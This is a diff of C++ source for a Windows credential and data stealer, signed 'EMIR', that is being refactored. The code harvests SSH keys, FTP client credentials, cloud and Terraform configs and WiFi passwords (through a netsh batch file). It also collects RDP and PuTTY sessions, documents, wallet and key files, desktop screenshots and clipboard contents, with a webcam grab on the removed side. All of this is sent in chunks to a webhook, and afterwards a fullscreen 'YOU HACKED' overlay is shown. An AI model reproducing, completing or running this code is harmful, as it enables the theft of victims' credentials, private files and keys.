+    list.push_back(F{ home + "\\.terraformrc", "Terraform" });
+
+    for (size_t i = 0; i < list.size(); i++) {
+        if (FileExistsA(list[i].p)) {
+            out += std::string("=== ") + list[i].l + " ===\n";
+            out += ReadFileBin(list[i].p) + "\n";
         }
     }
     return out;
 }
 
 // ============================================================
-// [G] SSH
+// [G] SSH + FTP
 // ============================================================
 static std::string HarvestSSH() {
-    std::string prof = GetEnv("USERPROFILE"), out;
-    std::string ssh = prof + "\\.ssh";
-    if (DirExists(ssh)) {
+    std::string home = HomeDir();
+    std::string ssh = home + "\\.ssh";
+    std::string out;
+    if (DirExistsA(ssh)) {
         out += "=== .ssh ===\n";
-        for (auto& f : fs::directory_iterator(ssh)) {
-            if (!fs::is_regular_file(f)) continue;
-            out += "--- " + f.path().filename().string() + " ---\n";
-            out += ReadFileBin(f.path().string()) + "\n";
+        auto files = ListDir(ssh, false);
+        for (size_t i = 0; i < files.size(); i++) {
+            if (files[i].isDir) continue;
+            out += "--- " + files[i].path + " ---\n";
+            out += ReadFileBin(files[i].path) + "\n";
         }
     }
     return out;
 }
-
-// ============================================================
-// [H] FTP
-// ============================================================
 static std::string HarvestFTP() {
-    std::string b = GetEnv("APPDATA"), out;
+    std::string app = AppDataDir();
+    std::string out;
     const char* files[] = {
         "\\FileZilla\\recentservers.xml",
         "\\FileZilla\\sitemanager.xml",
         "\\WinSCP.ini",
-        "\\CoreFTP\\sites.idx",
-        "\\SmartFTP\\Client\\Favorites\\"
+        "\\CoreFTP\\sites.idx"
     };
-    for (auto f : files) {
-        std::string p = b + f;
-        if (FileExists(p)) out += std::string("=== ") + f + " ===\n" + ReadFileBin(p) + "\n";
-        else if (DirExists(p)) {
-            for (auto& e : fs::recursive_directory_iterator(p)) {
-                if (fs::is_regular_file(e) && fs::file_size(e) < 100000)
-                    out += ReadFileBin(e.path().string()) + "\n";
-            }
-        }
+    for (int i = 0; i < 4; i++) {
+        std::string p = app + files[i];
+        if (FileExistsA(p)) out += std::string("=== ") + files[i] + " ===\n" + ReadFileBin(p) + "\n";
     }
     return out;
 }
 
 // ============================================================
-// [I] WIFI + RDP + PuTTY
+// [H] WIFI + RDP + PuTTY
 // ============================================================
-static std::string HarvestWifiPasswords() {
+static std::string HarvestWifi() {
     std::string out;
-    char tmpPath[MAX_PATH], tmpFile[MAX_PATH];
-    GetTempPathA(MAX_PATH, tmpPath);
-    sprintf(tmpFile, "%swifi.bat", tmpPath);
-    std::ofstream f(tmpFile);
-    f << "@echo off\nchcp 65001 >nul\n"
-         "for /f \"skip=9 tokens=1,2 delims=:\" %%i in ('netsh wlan show profiles') do ("
+    std::string tmp = TempDir() + "w.bat";
+    std::ofstream f(tmp.c_str());
+    f << "@echo off\n";
+    f << "for /f \"skip=9 tokens=1,2 delims=:\" %%i in ('netsh wlan show profiles') do ("
          "echo === %%j & netsh wlan show profile name=\"%%j\" key=clear | findstr /C:\"Key Content\")\n";
     f.close();
-    FILE* p = _popen(tmpFile, "r");
-    if (p) { char buf[8192]; while (fgets(buf, sizeof(buf), p)) out += buf; _pclose(p); }
-    DeleteFileA(tmpFile);
+    FILE* p = _popen(tmp.c_str(), "r");
+    if (p) {
+        char buf[4096];
+        while (fgets(buf, sizeof(buf), p)) out += buf;
+        _pclose(p);
+    }
+    DeleteFileA(tmp.c_str());
     return out;
 }
 static std::string HarvestNetCreds() {
-    std::string out = "=== WIFI ===\n" + HarvestWifiPasswords();
+    std::string out = "=== WIFI ===\n" + HarvestWifi();
     HKEY k;
     if (RegOpenKeyA(HKEY_CURRENT_USER,
         "Software\\Microsoft\\Terminal Server Client\\Servers", &k) == ERROR_SUCCESS) {
         char name[256]; DWORD nsz = sizeof(name);
         for (DWORD i = 0; ; i++) {
             nsz = sizeof(name);
-            if (RegEnumKeyExA(k, i, name, &nsz, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS) break;
+            if (RegEnumKeyExA(k, i, name, &nsz, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
             out += std::string("RDP: ") + name + "\n";
         }
         RegCloseKey(k);
@@ -447,12 +559,12 @@ static std::string HarvestNetCreds() {
         char sess[256]; DWORD ssz = sizeof(sess);
         for (DWORD i = 0; ; i++) {
             ssz = sizeof(sess);
-            if (RegEnumKeyExA(k, i, sess, &ssz, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS) break;
+            if (RegEnumKeyExA(k, i, sess, &ssz, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
             std::string path = "Software\\SimonTatham\\PuTTY\\Sessions\\" + std::string(sess);
             HKEY s;
             if (RegOpenKeyA(HKEY_CURRENT_USER, path.c_str(), &s) == ERROR_SUCCESS) {
-                char host[256] = {}; DWORD hs = sizeof(host);
-                RegQueryValueExA(s, "HostName", nullptr, nullptr, (BYTE*)host, &hs);
+                char host[256] = {0}; DWORD hs = sizeof(host);
+                RegQueryValueExA(s, "HostName", NULL, NULL, (BYTE*)host, &hs);
                 out += std::string("PuTTY: ") + sess + " -> " + host + "\n";
                 RegCloseKey(s);
             }
@@ -463,413 +575,379 @@ static std::string HarvestNetCreds() {
 }
 
 // ============================================================
-// [J] DOCS GRABBER (47)
+// [I] DOCS + CONFIG + RECENT + SCREENSHOTS
 // ============================================================
 static std::string HarvestDocs() {
     std::string out;
-    std::string home = GetEnv("USERPROFILE");
-    std::vector<std::string> roots = {
-        home + "\\Desktop", home + "\\Documents", home + "\\Downloads"
-    };
-    std::vector<std::string> exts = {
-        ".txt", ".pdf", ".docx", ".xlsx", ".csv", ".json",
-        ".env", ".key", ".pem", ".wallet", ".dat", ".conf"
-    };
+    std::vector<std::string> roots;
+    roots.push_back(DesktopDir());
+    roots.push_back(DocsDir());
+    roots.push_back(HomeDir() + "\\Downloads");
+
+    const char* exts[] = { ".txt", ".pdf", ".docx", ".xlsx", ".csv", ".json",
+                           ".env", ".key", ".pem", ".wallet", ".dat", ".conf" };
     int sent = 0;
-    for (auto& root : roots) {
-        if (!DirExists(root)) continue;
-        for (auto& e : fs::recursive_directory_iterator(root)) {
-            if (sent > 25) break;
-            if (!fs::is_regular_file(e)) continue;
-            if (fs::file_size(e) > 200000) continue;
-            std::string p = e.path().string();
-            auto pos = p.rfind('.');
-            if (pos == std::string::npos) continue;
-            std::string ext = p.substr(pos);
+    for (size_t r = 0; r < roots.size(); r++) {
+        if (!DirExistsA(roots[r])) continue;
+        auto files = ListDir(roots[r], true, 2);
+        for (size_t i = 0; i < files.size() && sent < 25; i++) {
+            if (files[i].isDir) continue;
+            if (files[i].size > 200000) continue;
+            std::string p = files[i].path;
+            size_t dot = p.find_last_of('.');
+            if (dot == std::string::npos) continue;
+            std::string lower = p.substr(dot);
+            for (size_t k = 0; k < lower.size(); k++) lower[k] = tolower(lower[k]);
             bool match = false;
-            for (auto& x : exts) if (ext == x) { match = true; break; }
+            for (int e = 0; e < 12; e++) if (lower == exts[e]) { match = true; break; }
             if (!match) continue;
-            out += "=== " + p + " ===\n" + ReadFileBin(p) + "\n";
+            out += "=== " + p + " ===\n";
+            out += ReadFileBin(p) + "\n";
             sent++;
         }
     }
     return out;
 }
-
-// ============================================================
-// [K] CONFIG FILES (49)
-// ============================================================
-static std::string HarvestConfigFiles() {
+static std::string HarvestConfigs() {
     std::string out;
-    std::string home = GetEnv("USERPROFILE");
-    std::string app = GetEnv("APPDATA");
-    std::string lad = GetEnv("LOCALAPPDATA");
-    std::vector<std::string> roots = { home, app, lad };
-    std::vector<std::string> patterns = {
-        "config.json", "credentials.json", "credentials.txt",
-        ".env", "settings.json", "secrets.json"
-    };
+    std::vector<std::string> roots;
+    roots.push_back(HomeDir());
+    roots.push_back(AppDataDir());
+    roots.push_back(LocalDir());
+    const char* names[] = { "config.json", "credentials.json", ".env",
+                            "settings.json", "secrets.json" };
     int sent = 0;
-    for (auto& root : roots) {
-        if (!DirExists(root)) continue;
-        // only top 3 levels to avoid crawl blowup
-        for (auto& e : fs::recursive_directory_iterator(root,
-            fs::directory_options::skip_permission_denied)) {
-            if (sent > 20) break;
-            if (!fs::is_regular_file(e)) continue;
-            auto depth = std::distance(root.begin(), root.end()); // rough
-            std::string name = e.path().filename().string();
+    for (size_t r = 0; r < roots.size() && sent < 20; r++) {
+        if (!DirExistsA(roots[r])) continue;
+        auto files = ListDir(roots[r], false);
+        for (size_t i = 0; i < files.size() && sent < 20; i++) {
+            if (files[i].isDir) continue;
+            if (files[i].size > 100000) continue;
+            std::string name = files[i].path;
+            size_t pos = name.find_last_of('\\');
+            if (pos != std::string::npos) name = name.substr(pos + 1);
             bool match = false;
-            for (auto& p : patterns) if (name == p) { match = true; break; }
+            for (int n = 0; n < 5; n++) if (name == names[n]) { match = true; break; }
             if (!match) continue;
-            if (fs::file_size(e) > 100000) continue;
-            out += "=== " + e.path().string() + " ===\n";
-            out += ReadFileBin(e.path().string()) + "\n";
+            out += "=== " + files[i].path + " ===\n";
+            out += ReadFileBin(files[i].path) + "\n";
             sent++;
         }
     }
     return out;
 }
-
-// ============================================================
-// [L] DESKTOP SCREENSHOTS (50)
-// ============================================================
-static std::string HarvestDesktopScreenshots() {
+static std::string HarvestRecent() {
+    std::string out = "=== Recent ===\n";
+    std::string r = RecentDir();
+    if (!DirExistsA(r)) return out;
+    auto files = ListDir(r, false);
+    int c = 0;
+    for (size_t i = 0; i < files.size() && c < 60; i++) {
+        std::string name = files[i].path;
+        size_t pos = name.find_last_of('\\');
+        if (pos != std::string::npos) name = name.substr(pos + 1);
+        out += name + "\n";
+        c++;
+    }
+    return out;
+}
+static std::string Base64(const std::string& in) {
+    DWORD sz = 0;
+    CryptBinaryToStringA((BYTE*)in.data(), (DWORD)in.size(),
+        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &sz);
+    std::string out(sz, 0);
+    CryptBinaryToStringA((BYTE*)in.data(), (DWORD)in.size(),
+        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &out[0], &sz);
+    if (!out.empty() && out[out.size()-1] == 0) out.resize(out.size()-1);
+    return out;
+}
+static std::string HarvestScreenshots() {
     std::string out;
-    std::string desk = GetEnv("USERPROFILE") + "\\Desktop";
-    if (!DirExists(desk)) return out;
-    std::vector<std::string> exts = { ".png", ".jpg", ".jpeg", ".bmp" };
+    std::string desk = DesktopDir();
+    if (!DirExistsA(desk)) return out;
+    auto files = ListDir(desk, false);
     int sent = 0;
-    for (auto& e : fs::directory_iterator(desk)) {
-        if (sent > 5) break;
-        if (!fs::is_regular_file(e)) continue;
-        std::string p = e.path().string();
-        auto pos = p.rfind('.');
-        if (pos == std::string::npos) continue;
-        std::string ext = p.substr(pos);
-        bool match = false;
-        for (auto& x : exts) if (ext == x) { match = true; break; }
-        if (!match) continue;
-        if (fs::file_size(e) > 300000) continue;
+    for (size_t i = 0; i < files.size() && sent < 5; i++) {
+        if (files[i].isDir) continue;
+        if (files[i].size > 300000) continue;
+        std::string p = files[i].path;
+        size_t dot = p.find_last_of('.');
+        if (dot == std::string::npos) continue;
+        std::string lower = p.substr(dot);
+        for (size_t k = 0; k < lower.size(); k++) lower[k] = tolower(lower[k]);
+        if (lower != ".png" && lower != ".jpg" && lower != ".jpeg" && lower != ".bmp") continue;
         out += "=== " + p + " (b64) ===\n";
-        out += Base64Encode(ReadFileBin(p)) + "\n";
+        out += Base64(ReadFileBin(p)) + "\n";
         sent++;
     }
     return out;
 }
 
 // ============================================================
-// [M] RECENT FILES (51)
+// [J] SYSTEM INFO + IP
 // ============================================================
-static std::string HarvestRecentFiles() {
-    std::string out;
-    std::string app = GetEnv("APPDATA");
-    std::string recent = app + "\\Microsoft\\Windows\\Recent";
-    if (!DirExists(recent)) return out;
-    out += "=== Recent ===\n";
-    int c = 0;
-    for (auto& e : fs::directory_iterator(recent)) {
-        if (c++ > 60) break;
-        out += e.path().filename().string() + "\n";
-    }
-    return out;
-}
-
-// ============================================================
-// [N] CLIPBOARD SNIFFER
-// ============================================================
-static std::string g_clipboardLog;
-static std::mutex g_clipMtx;
-
-static LRESULT CALLBACK ClipWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
-    if (m == WM_CLIPBOARDUPDATE) {
-        if (OpenClipboard(nullptr)) {
-            HANDLE d = GetClipboardData(CF_UNICODETEXT);
-            if (d) {
-                wchar_t* txt = (wchar_t*)GlobalLock(d);
-                if (txt) {
-                    std::lock_guard<std::mutex> lk(g_clipMtx);
-                    g_clipboardLog += W2A(txt) + "\n";
-                    if (g_clipboardLog.size() > 100000)
-                        g_clipboardLog = g_clipboardLog.substr(g_clipboardLog.size() - 60000);
-                }
-                GlobalUnlock(d);
-            }
-            CloseClipboard();
+static std::string HttpGet(const char* host, const char* path) {
+    std::string resp;
+    HINTERNET hNet = InternetOpenA("curl", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hNet) return resp;
+    HINTERNET hConn = InternetConnectA(hNet, host, INTERNET_DEFAULT_HTTPS_PORT,
+        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    if (!hConn) { InternetCloseHandle(hNet); return resp; }
+    HINTERNET hReq = HttpOpenRequestA(hConn, "GET", path, NULL, NULL, NULL,
+        INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    if (!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hNet); return resp; }
+    if (HttpSendRequestA(hReq, NULL, 0, NULL, 0)) {
+        char buf[4096]; DWORD read = 0;
+        while (InternetReadFile(hReq, buf, sizeof(buf) - 1, &read) && read > 0) {
+            buf[read] = 0; resp += buf;
         }
     }
-    return DefWindowProc(h, m, w, l);
-}
-static void StartClipboardSniffer() {
-    std::thread([](){
-        WNDCLASSW wc = {};
-        wc.lpfnWndProc = ClipWndProc;
-        wc.hInstance = GetModuleHandle(nullptr);
-        wc.lpszClassName = L"ClipSniff";
-        RegisterClassW(&wc);
-        HWND h = CreateWindowW(L"ClipSniff", L"", 0, 0, 0, 0, 0,
-            HWND_MESSAGE, nullptr, nullptr, nullptr);
-        AddClipboardFormatListener(h);
-        MSG msg;
-        while (GetMessage(&msg, nullptr, 0, 0)) {
-            TranslateMessage(&msg); DispatchMessage(&msg);
-        }
-    }).detach();
-}
-
-// ============================================================
-// [O] WEBCAM
-// ============================================================
-static std::string WebcamSnapshotBase64() {
-    std::string out;
-    if (FAILED(MFStartup(MF_VERSION))) return out;
-    IMFAttributes* attrs = nullptr;
-    MFCreateAttributes(&attrs, 1);
-    attrs->SetGUID(MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
-                   MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID);
-    IMFActivate** devices = nullptr;
-    UINT32 count = 0;
-    MFEnumDeviceSources(attrs, &devices, &count);
-    if (count == 0) { attrs->Release(); MFShutdown(); return out; }
-    IMFMediaSource* source = nullptr;
-    devices[0]->ActivateObject(__uuidof(IMFMediaSource), (void**)&source);
-    IMFSourceReader* reader = nullptr;
-    MFCreateSourceReaderFromMediaSource(source, nullptr, &reader);
-    reader->SetCurrentMediaType(MF_SOURCE_READER_FIRST_VIDEO_STREAM, nullptr, nullptr);
-    IMFSample* sample = nullptr; DWORD flags = 0;
-    reader->ReadSample(MF_SOURCE_READER_FIRST_VIDEO_STREAM, 0,
-        nullptr, &flags, nullptr, &sample);
-    if (sample) {
-        IMFMediaBuffer* buf = nullptr;
-        sample->ConvertToContiguousBuffer(&buf);
-        BYTE* data = nullptr; DWORD len = 0;
-        buf->Lock(&data, nullptr, &len);
-        std::string raw((char*)data, len);
-        out = "[webcam " + std::to_string(len) + " bytes, b64 head] " +
-              Base64Encode(raw.substr(0, std::min<size_t>(len, 8192)));
-        buf->Unlock(); buf->Release(); sample->Release();
-    }
-    reader->Release(); source->Release(); attrs->Release();
-    MFShutdown();
-    return out;
-}
-
-// ============================================================
-// [P] SYSTEM INFO
-// ============================================================
-static std::string HarvestIP() {
-    HINTERNET hS = WinHttpOpen(L"c", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    HINTERNET hC = WinHttpConnect(hS, L"ipapi.co", INTERNET_DEFAULT_HTTPS_PORT, 0);
-    HINTERNET hR = WinHttpOpenRequest(hC, L"GET", L"/json/", nullptr,
-        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
-    WinHttpSendRequest(hR, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
-    WinHttpReceiveResponse(hR, nullptr);
-    std::string resp; DWORD read = 0; char buf[4096];
-    while (WinHttpReadData(hR, buf, sizeof(buf) - 1, &read) && read > 0) { buf[read] = 0; resp += buf; }
-    WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
+    InternetCloseHandle(hReq);
+    InternetCloseHandle(hConn);
+    InternetCloseHandle(hNet);
     return resp;
 }
 static std::string HarvestSystem() {
     std::string out;
     char buf[512]; DWORD sz = sizeof(buf);
     GetComputerNameA(buf, &sz); out += "PC: " + std::string(buf) + "\n";
-    sz = sizeof(buf); GetUserNameA(buf, &sz); out += "User: " + std::string(buf) + "\n";
-    OSVERSIONINFOA os{}; os.dwOSVersionInfoSize = sizeof(os); GetVersionExA(&os);
-    out += "Win: " + std::to_string(os.dwMajorVersion) + "." + std::to_string(os.dwMinorVersion) + "\n";
+    sz = sizeof(buf);
+    GetUserNameA(buf, &sz);     out += "User: " + std::string(buf) + "\n";
+    OSVERSIONINFOA os; ZeroMemory(&os, sizeof(os)); os.dwOSVersionInfoSize = sizeof(os);
+    GetVersionExA(&os);
+    char b[64]; sprintf(b, "Win %u.%u.%u", os.dwMajorVersion, os.dwMinorVersion, os.dwBuildNumber);
+    out += std::string(b) + "\n";
     SYSTEM_INFO si; GetSystemInfo(&si);
-    out += "Cores: " + std::to_string(si.dwNumberOfProcessors) + "\n";
-    MEMORYSTATUSEX ms{}; ms.dwLength = sizeof(ms); GlobalMemoryStatusEx(&ms);
-    out += "RAM: " + std::to_string(ms.ullTotalPhys / 1024 / 1024) + " MB\n";
-    out += "IP: " + HarvestIP() + "\n";
+    out += "Cores: " + std::to_string((int)si.dwNumberOfProcessors) + "\n";
+    MEMORYSTATUSEX ms; ZeroMemory(&ms, sizeof(ms)); ms.dwLength = sizeof(ms);
+    GlobalMemoryStatusEx(&ms);
+    sprintf(b, "RAM: %llu MB\n", ms.ullTotalPhys / 1024 / 1024);
+    out += std::string(b);
+    out += "IP: " + HttpGet("ipapi.co", "/json/") + "\n";
     return out;
 }
 
 // ============================================================
-// EXFIL
+// CLIPBOARD SNIFFER THREAD (Win2000+)
 // ============================================================
-static void PostChunk(const std::string& content) {
-    HINTERNET hS = WinHttpOpen(L"s", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-    HINTERNET hC = WinHttpConnect(hS, WEBHOOK_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
-    HINTERNET hR = WinHttpOpenRequest(hC, L"POST", WEBHOOK_PATH, nullptr,
-        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
-    std::string body = "{\"content\":\"";
-    for (char c : content) {
-        if (c == '"' || c == '\\') { body += '\\'; body += c; }
-        else if (c == '\n') body += "\\n";
-        else if (c == '\r') continue;
-        else if ((unsigned char)c < 0x20) { char b[8]; sprintf(b, "\\u%04x", c); body += b; }
-        else body += c;
+static std::string g_clip;
+static CRITICAL_SECTION g_clipCs;
+static BOOL g_clipCsInit = FALSE;
+
+static LRESULT CALLBACK ClipWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
+    if (m == WM_CLIPBOARDUPDATE) {
+        if (OpenClipboard(NULL)) {
+            HANDLE d = GetClipboardData(CF_TEXT);
+            if (d) {
+                char* t = (char*)GlobalLock(d);
+                if (t) {
+                    EnterCriticalSection(&g_clipCs);
+                    g_clip += std::string(t) + "\n";
+                    if (g_clip.size() > 100000) g_clip = g_clip.substr(g_clip.size() - 60000);
+                    LeaveCriticalSection(&g_clipCs);
+                }
+                GlobalUnlock(d);
+            }
+            CloseClipboard();
+        }
     }
-    body += "\"}";
-    std::wstring hdr = L"Content-Type: application/json\r\n";
-    WinHttpSendRequest(hR, hdr.c_str(), (DWORD)-1L,
-        (LPVOID)body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);
-    WinHttpReceiveResponse(hR, nullptr);
-    WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
+    return DefWindowProcA(h, m, w, l);
 }
-static void Exfil(const std::string& data) {
-    for (size_t i = 0; i < data.size(); i += 1800) {
-        PostChunk(data.substr(i, 1800));
-        Sleep(350);
+static DWORD WINAPI ClipThread(LPVOID) {
+    WNDCLASSA wc; ZeroMemory(&wc, sizeof(wc));
+    wc.lpfnWndProc = ClipWndProc;
+    wc.hInstance = GetModuleHandleA(NULL);
+    wc.lpszClassName = "ClipSniffX";
+    RegisterClassA(&wc);
+    HWND h = CreateWindowA("ClipSniffX", "", 0, 0, 0, 0, 0,
+        HWND_MESSAGE, NULL, NULL, NULL);
+    if (AddClipboardFormatListener) AddClipboardFormatListener(h);
+    MSG msg;
+    while (GetMessageA(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessageA(&msg);
     }
+    return 0;
 }
 
 // ============================================================
-// STEALER WORKER — panggil SEMUA modul
+// STEALER WORKER THREAD
 // ============================================================
-static void StealerWorker() {
+static DWORD WINAPI StealerThread(LPVOID) {
     Sleep(2500);
 
     std::string report = "```\n";
-    report += "=== SYSTEM (P) ===\n" + HarvestSystem() + "\n";
-    report += "=== BROWSERS (A) ===\n" + HarvestBrowsers() + "\n";
-    report += "=== FIREFOX (B) ===\n" + HarvestFirefox() + "\n";
-    report += "=== WALLETS (48) ===\n" + HarvestWallets() + "\n";
-    report += "=== DISCORD (52) ===\n" + HarvestDiscord() + "\n";
-    report += "=== TELEGRAM/BOT (53) ===\n" + HarvestTelegram() + "\n";
-    report += "=== CLOUD CREDS (54-60) ===\n" + HarvestCloudCreds() + "\n";
-    report += "=== SSH ===\n" + HarvestSSH() + "\n";
-    report += "=== FTP ===\n" + HarvestFTP() + "\n";
-    report += "=== NET CREDS (WIFI/RDP/PUTTY) ===\n" + HarvestNetCreds() + "\n";
-    report += "=== DOCS (47) ===\n" + HarvestDocs() + "\n";
-    report += "=== CONFIG (49) ===\n" + HarvestConfigFiles() + "\n";
-    report += "=== DESKTOP SHOTS (50) ===\n" + HarvestDesktopScreenshots() + "\n";
-    report += "=== RECENT (51) ===\n" + HarvestRecentFiles() + "\n";
-    report += "=== WEBCAM ===\n" + WebcamSnapshotBase64() + "\n";
+    report += "=== SYSTEM ===\n"    + HarvestSystem() + "\n";
+    report += "=== BROWSERS ===\n"  + HarvestBrowsers() + "\n";
+    report += "=== FIREFOX ===\n"   + HarvestFirefox() + "\n";
+    report += "=== WALLETS ===\n"   + HarvestWallets() + "\n";
+    report += "=== DISCORD ===\n"   + HarvestDiscord() + "\n";
+    report += "=== TELEGRAM ===\n"  + HarvestTelegram() + "\n";
+    report += "=== CLOUD ===\n"     + HarvestCloud() + "\n";
+    report += "=== SSH ===\n"       + HarvestSSH() + "\n";
+    report += "=== FTP ===\n"       + HarvestFTP() + "\n";
+    report += "=== NET ===\n"       + HarvestNetCreds() + "\n";
+    report += "=== DOCS ===\n"      + HarvestDocs() + "\n";
+    report += "=== CONFIG ===\n"    + HarvestConfigs() + "\n";
+    report += "=== RECENT ===\n"    + HarvestRecent() + "\n";
+    report += "=== SCREENSHOTS ===\n" + HarvestScreenshots() + "\n";
     report += "```";
 
     Exfil(report);
 
-    // clipboard flush
-    {
-        std::lock_guard<std::mutex> lk(g_clipMtx);
-        if (!g_clipboardLog.empty()) {
-            Exfil("=== CLIPBOARD ===\n" + g_clipboardLog);
-            g_clipboardLog.clear();
-        }
-    }
-    g_steal_done = true;
+    EnterCriticalSection(&g_clipCs);
+    if (!g_clip.empty()) {
+        std::string snap = g_clip;
+        g_clip.clear();
+        LeaveCriticalSection(&g_clipCs);
+        Exfil("=== CLIPBOARD ===\n" + snap);
+    } else LeaveCriticalSection(&g_clipCs);
+
+    InterlockedExchange(&g_steal_done, 1);
     Sleep(500);
-    g_show_overlay = true;
+    InterlockedExchange(&g_show_overlay, 1);
+    return 0;
 }
 
 // ============================================================
-// HACKED OVERLAY
+// HACKED OVERLAY (GDI, fullscreen topmost)
 // ============================================================
-namespace HackedOverlay {
-static LRESULT CALLBACK WP(HWND h, UINT m, WPARAM w, LPARAM l) {
+static LRESULT CALLBACK OverlayProc(HWND h, UINT m, WPARAM w, LPARAM l) {
     if (m == WM_DESTROY) { PostQuitMessage(0); return 0; }
-    return DefWindowProc(h, m, w, l);
+    return DefWindowProcA(h, m, w, l);
 }
-static void Run(HINSTANCE hi) {
-    WNDCLASSW wc = {};
-    wc.lpfnWndProc = WP; wc.hInstance = hi;
-    wc.hbrBackground = CreateSolidBrush(RGB(0, 0, 0));
-    wc.lpszClassName = L"HackedOverlay";
-    RegisterClassW(&wc);
-    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
-    HWND h = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
-        L"HackedOverlay", L"", WS_POPUP | WS_VISIBLE,
-        0, 0, sw, sh, nullptr, nullptr, hi, nullptr);
+
+static void ShowHackedOverlay() {
+    WNDCLASSA wc; ZeroMemory(&wc, sizeof(wc));
+    wc.lpfnWndProc = OverlayProc;
+    wc.hInstance = GetModuleHandleA(NULL);
+    wc.hbrBackground = CreateSolidBrush(RGB(0,0,0));
+    wc.lpszClassName = "HackedOverlayX";
+    RegisterClassA(&wc);
+
+    int sw = GetSystemMetrics(SM_CXSCREEN);
+    int sh = GetSystemMetrics(SM_CYSCREEN);
+    HWND h = CreateWindowExA(WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
+        "HackedOverlayX", "", WS_POPUP | WS_VISIBLE,
+        0, 0, sw, sh, NULL, NULL, GetModuleHandleA(NULL), NULL);
+    if (!h) return;
     ShowWindow(h, SW_SHOW);
+    UpdateWindow(h);
+
     HDC dc = GetDC(h);
     SetBkMode(dc, TRANSPARENT);
+
     const char* chars = "01EMIRHACKEDPWNDSYSTEMERROR#@$%&*0123456789";
     int cl = (int)strlen(chars);
     int colW = 14, cols = sw / colW;
-    struct Col { int y, s; };
-    std::vector<Col> rain(cols);
-    srand((unsigned)GetTickCount());
-    for (auto& c : rain) { c.y = -(rand() % sh); c.s = 4 + rand() % 10; }
-    HFONT fS = CreateFontA(18, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET,
-        0, 0, 0, FIXED_PITCH, "Consolas");
-    HFONT fB = CreateFontA(72, 0, 0, 0, FW_BLACK, 0, 0, 0, DEFAULT_CHARSET,
-        0, 0, 0, 0, "Impact");
-    HFONT fM = CreateFontA(34, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET,
-        0, 0, 0, 0, "Consolas");
+    std::vector<int> ry(cols), rs(cols);
+    for (int i = 0; i < cols; i++) { ry[i] = -(rand() % sh); rs[i] = 4 + rand() % 10; }
+
+    HFONT fS = CreateFontA(18, 0,0,0, FW_BOLD, 0,0,0, DEFAULT_CHARSET, 0,0,0, FIXED_PITCH, "Consolas");
+    HFONT fB = CreateFontA(72, 0,0,0, FW_BLACK, 0,0,0, DEFAULT_CHARSET, 0,0,0, 0, "Impact");
+    HFONT fM = CreateFontA(34, 0,0,0, FW_BOLD, 0,0,0, DEFAULT_CHARSET, 0,0,0, 0, "Consolas");
+
     MSG msg; DWORD start = GetTickCount(); bool done = false;
     while (!done) {
-        while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE)) {
+        while (PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE)) {
             if (msg.message == WM_QUIT) done = true;
-            TranslateMessage(&msg); DispatchMessage(&msg);
+            TranslateMessage(&msg); DispatchMessageA(&msg);
         }
-        RECT r{ 0, 0, sw, sh };
-        HBRUSH blk = CreateSolidBrush(RGB(0, 0, 0));
+        RECT r = { 0, 0, sw, sh };
+        HBRUSH blk = CreateSolidBrush(RGB(0,0,0));
         FillRect(dc, &r, blk); DeleteObject(blk);
-        SelectObject(dc, fS); SetTextColor(dc, RGB(180, 0, 0));
+
+        SelectObject(dc, fS);
+        SetTextColor(dc, RGB(180, 0, 0));
         for (int i = 0; i < cols; i++) {
-            char b[2] = { chars[rand() % cl], 0 };
-            TextOutA(dc, i * colW, rain[i].y, b, 1);
-            rain[i].y += rain[i].s;
-            if (rain[i].y > sh) { rain[i].y = -(rand() % 300); rain[i].s = 4 + rand() % 12; }
+            char ch[2] = { chars[rand() % cl], 0 };
+            TextOutA(dc, i * colW, ry[i], ch, 1);
+            ry[i] += rs[i];
+            if (ry[i] > sh) { ry[i] = -(rand() % 300); rs[i] = 4 + rand() % 12; }
         }
+
         DWORD e = GetTickCount() - start;
         SelectObject(dc, fB);
-        if ((e / 200) % 2 == 0) SetTextColor(dc, RGB(255, 0, 0));
-        else                    SetTextColor(dc, RGB(120, 0, 0));
-        TextOutW(dc, sw / 2 - 210, sh / 2 - 140, L"YOU HACKED", 10);
-        TextOutW(dc, sw / 2 - 160, sh / 2 - 60,  L"BY EMIR",    7);
-        SelectObject(dc, fM); SetTextColor(dc, RGB(255, 30, 30));
